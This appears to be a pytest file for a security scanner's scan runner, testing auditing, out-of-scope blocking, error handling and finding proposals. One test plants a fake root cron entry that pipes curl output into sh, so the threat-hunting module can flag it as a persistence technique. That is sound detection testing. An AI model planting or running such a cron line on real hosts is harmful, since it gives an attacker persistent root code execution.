import json

from cyberthunder.scan import ScanRun

from . import fakes
from .conftest import HOST, NO_ADAPTER, OUT_OF_SCOPE


def actions(ctx):
    return [r["action"] for r in ctx.audit.records()]


def test_scan_happy_path_persists_and_audits(ctx):
    run = ctx.scanner.start([HOST], requested_by="it2.smith", background=False)
    assert run.status == "done"
    d = ctx.store.scan_dir(run.id)
    saved = json.loads((d / "run.json").read_text(encoding="utf-8"))
    assert saved["status"] == "done" and saved["results"][HOST]["status"] == "done"
    assert (d / "findings.json").exists()
    collected = json.loads((d / "raw" / HOST / "collected.json").read_text(encoding="utf-8"))
    assert collected["target_id"] == HOST and collected["facts"]["os_name"] == "Rocky Linux"
    findings = ctx.store.load_findings(run.id)
    assert {f.rule_id for f in findings} == {fakes.RULE_ROOT_LOGIN, fakes.RULE_PASS_MAX}
    assert all(f.scan_id == run.id and f.asset_type == "linux" for f in findings)
    assert run.results[HOST].open == 2 and run.summary["total"] == 2
    acts = actions(ctx)
    assert acts.index("scan.start") < acts.index("scan.target") < acts.index("scan.finish")
    assert "inventory.update" in acts
    assert ctx.inventory.get(HOST).last_scan is not None
    assert all(t.closed for t in ctx.adapters.get("linux").transports_made)


def test_default_targets_and_background(ctx):
    run = ctx.scanner.start(requested_by="it2.smith")
    assert set(run.targets) == {HOST, NO_ADAPTER}            # out-of-scope target is not a default
    done = ctx.scanner.join(run.id, timeout=30)
    assert done.status == "done" and done.progress == {"done": 2, "total": 2}
    assert ctx.scanner.latest().id == run.id
    assert isinstance(ctx.scanner.list()[0], ScanRun)


def test_out_of_scope_target_skipped_and_blocked(ctx):
    run = ctx.scanner.start([OUT_OF_SCOPE], background=False)
    r = run.results[OUT_OF_SCOPE]
    assert r.status == "skipped" and "out of scope" in r.errors[0]
    blocked = [x for x in ctx.audit.records() if x["action"] == "action.blocked"]
    assert blocked and blocked[0]["outcome"] == "blocked" and blocked[0]["subject"] == OUT_OF_SCOPE
    assert not ctx.adapters.get("linux").transports_made        # never contacted


def test_unknown_target_skipped(ctx):
    run = ctx.scanner.start(["not-in-inventory"], background=False)
    assert run.results["not-in-inventory"].status == "skipped"


def test_missing_adapter_skipped(ctx):
    run = ctx.scanner.start([NO_ADAPTER], background=False)
    r = run.results[NO_ADAPTER]
    assert r.status == "skipped" and "no adapter" in r.errors[0]


def test_transport_error_marks_target_error(ctx, fake_adapter):
    fake_adapter.fail_transport = True
    run = ctx.scanner.start([HOST], background=False)
    assert run.results[HOST].status == "error"
    assert run.status == "error"                                 # every target failed
    fin = [x for x in ctx.audit.records() if x["action"] == "scan.finish"][0]
    assert fin["outcome"] == "error"


def test_rule_filter_limits_findings(ctx):
    run = ctx.scanner.start([HOST], rule_filter=[fakes.STIG_ROOT_LOGIN], background=False)
    assert [f.rule_id for f in ctx.store.load_findings(run.id)] == [fakes.RULE_ROOT_LOGIN]


def test_hunt_finding_cites_attack(ctx):
    fakes.HOSTS[HOST]["files"][fakes.CRON_BACKDOOR] = "* * * * * root curl x | sh\n"
    run = ctx.scanner.start([HOST], modules=["hunt"], background=False)
    (f,) = ctx.store.load_findings(run.id)
    assert "T1053.003" in f.citations


def test_auto_propose_after_scan(make_ctx):
    ctx = make_ctx(auto_propose=True)
    run = ctx.scanner.start([HOST], background=False)
    assert run.summary["proposals_created"] == 2
    again = ctx.scanner.start([HOST], background=False)
    assert again.summary["proposals_created"] == 0                # duplicates refused
    assert len(ctx.gate.list()) == 2


def test_verify_trigger_does_not_propose(make_ctx):
    ctx = make_ctx(auto_propose=True)
    run = ctx.scanner.start([HOST], trigger="verify", background=False)
    assert "proposals_created" not in run.summary and not ctx.gate.list()


def test_auto_propose_error_recorded(make_ctx, monkeypatch):
    ctx = make_ctx(auto_propose=True)

    def boom(*a, **k):
        raise RuntimeError("library offline")
    monkeypatch.setattr(ctx.engine, "auto_propose", boom)
    run = ctx.scanner.start([HOST], background=False)
    assert run.status == "done" and run.summary["auto_propose_error"] == "library offline"


def test_precompute_guarded(make_ctx):
    ctx = make_ctx(auto_propose=False, explain_precompute=True)

    class Unbuilt:
        def get(self, fid): return None
        def precompute(self, findings, background=True): raise NotImplementedError

    class Broken(Unbuilt):
        def precompute(self, findings, background=True): raise RuntimeError("model down")

    class Works(Unbuilt):
        def precompute(self, findings, background=True): return len(list(findings))

    ctx.explain = Unbuilt()
    assert ctx.scanner.start([HOST], background=False).summary["explanations_queued"] == 0
    ctx.explain = Broken()
    assert ctx.scanner.start([HOST], background=False).summary["explain_error"] == "model down"
    ctx.explain = Works()
    assert ctx.scanner.start([HOST], background=False).summary["explanations_queued"] == 2
    ctx.explain = None
    assert ctx.scanner.start([HOST], background=False).status == "done"
